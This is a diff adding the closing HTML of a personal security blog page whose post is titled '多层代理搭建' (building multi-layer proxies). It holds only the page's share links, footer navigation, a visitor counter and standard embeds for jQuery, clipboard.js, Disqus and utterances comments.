+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&name=多层代理搭建&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/04/%E5%9F%9F/%E4%BB%A3%E7%90%86/&t=多层代理搭建"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
